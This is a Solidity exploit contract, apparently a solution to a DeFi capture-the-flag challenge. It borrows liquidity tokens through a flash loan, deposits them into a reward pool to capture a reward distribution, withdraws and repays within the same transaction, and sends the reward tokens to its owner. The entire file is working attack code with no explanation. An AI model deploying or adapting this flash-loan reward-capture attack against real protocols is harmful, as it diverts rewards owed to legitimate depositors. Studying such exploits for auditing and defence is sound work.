// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface flashPool {
    function flashLoan(uint256 amount) external;
}

interface rewardPool {
    function deposit(uint256 amountToDeposit) external;
    function withdraw(uint256 amountToWithdraw) external;
    function distributeRewards() external returns (uint256);
}

interface Token {
    function balanceOf(address addr) external returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address addr, uint256 amt) external;
}

contract attack05 {
    address private flash_pool;
    address private reward_pool;
    address private liquidity_token;
    address private reward_token;
    address private owner;
    constructor (address _flashpool, address _rewardpool, address _liuidityToken, address _rewardtoken) {
        flash_pool = _flashpool;
        reward_pool = _rewardpool;
        liquidity_token = _liuidityToken;
        reward_token = _rewardtoken;
        owner = msg.sender;
    }

    function receiveFlashLoan(uint256 amount) external {
        Token(liquidity_token).approve(reward_pool, amount);
        rewardPool(reward_pool).deposit(amount);
        rewardPool(reward_pool).distributeRewards();
        rewardPool(reward_pool).withdraw(amount);
        Token(liquidity_token).transfer(flash_pool, amount);
        uint _amount = Token(reward_token).balanceOf(address(this));
        Token(reward_token).transfer(owner, _amount);
    }

    function attack_dr(uint256 _amount) external {
        flashPool(flash_pool).flashLoan(_amount);
    }

}
